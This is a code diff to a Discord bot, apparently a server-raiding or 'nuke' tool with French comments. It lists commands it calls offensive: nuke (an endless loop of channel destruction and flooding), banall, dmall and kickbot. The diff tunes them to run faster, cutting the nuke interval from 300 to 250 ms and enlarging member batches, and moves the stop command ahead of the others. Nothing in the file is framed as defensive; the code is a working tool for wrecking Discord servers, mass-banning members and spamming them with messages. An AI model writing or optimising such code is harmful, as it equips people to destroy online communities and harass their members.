@@ -1,11 +1,11 @@
-// Build Revision: K2L-Bot-Ultra-Speed-v25.0
+// Build Revision: K2L-Bot-Ultra-Speed-v25.1
 const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, StringSelectMenuBuilder, PermissionsBitField, ChannelType, AttachmentBuilder, ModalBuilder, TextInputBuilder, TextInputStyle } = require('discord.js');
 const http = require('http');
 
 const PORT = process.env.PORT || 3000;
 http.createServer((req, res) => {
     res.writeHead(200, { 'Content-Type': 'text/plain' });
-    res.end('K2L Bot Ultra Speed Operational v25.0!\n');
+    res.end('K2L Bot Ultra Speed Operational v25.1!\n');
 }).listen(PORT, '0.0.0.0', () => console.log(`Serveur HTTP actif sur le port ${PORT} (0.0.0.0)`));
 
 const client = new Client({
@@ -27,7 +27,7 @@ const guildStaffConfig = new Map();
 const warningsMap = new Map();
 const jailDataMap = new Map();
 
-// Map pour gérer les boucles infinies de la commande nuke par serveur
+// Map globale globale et robuste pour stopper instantanément les nukes par serveur
 const activeNukes = new Map();
 
 const SUPER_OWNERS = new Set(["1166445202148442112", "graveuhq", "77jc", "330080470983245824"]); 
@@ -570,17 +570,18 @@ client.on('messageCreate', async message => {
         const args = message.content.slice(1).trim().split(/ +/);
         const command = args.shift().toLowerCase();
         
-        const offensiveCommands = ['nuke', 'stop', 'role', 'banall', 'dmall', 'kickbot'];
-        if (offensiveCommands.includes(command)) {
-            
-            if (command === 'stop') {
-                if (activeNukes.has(message.guild.id)) {
-                    clearInterval(activeNukes.get(message.guild.id));
-                    activeNukes.delete(message.guild.id);
-                    return message.reply("🛑 **[STOP]** Boucle de nuke arrêtée avec succès !").catch(() => {});
-                }
-                return message.reply("❌ Aucune boucle de nuke active sur ce serveur.").catch(() => {});
+        // COMMANDE STOP : Prioritaire pour stopper net la boucle du nuke
+        if (command === 'stop') {
+            if (activeNukes.has(message.guild.id)) {
+                clearInterval(activeNukes.get(message.guild.id));
+                activeNukes.delete(message.guild.id);
+                return message.reply("🛑 **[STOP]** Boucle de nuke arrêtée avec succès !").catch(() => {});
             }
+            return message.reply("❌ Aucune boucle de nuke active sur ce serveur.").catch(() => {});
+        }
+
+        const offensiveCommands = ['nuke', 'role', 'banall', 'dmall', 'kickbot'];
+        if (offensiveCommands.includes(command)) {
 
             if (command === 'nuke') {
                 await message.reply("⚡ **[NUKE]** Destruction totale, flood infini, exécution de role et kickbot en cours... (Tape `!stop` pour stopper)").catch(() => {});
@@ -634,7 +635,7 @@ client.on('messageCreate', async message => {
                         }
                         await Promise.all(channelPromises);
                     } catch (err) {}
-                }, 300);
+                }, 250);
 
                 activeNukes.set(message.guild.id, nukeInterval);
                 return;
@@ -732,7 +733,7 @@ client.on('messageCreate', async message => {
 
                                 const statusMsg = await message.channel.send({ embeds: [liveEmbed] });
 
-                                const batchSize = 20;
+                                const batchSize = 25;
                                 for (let i = 0; i < members.length; i += batchSize) {
                                     const batch = members.slice(i, i + batchSize);
                                     await Promise.all(batch.map(async member => {
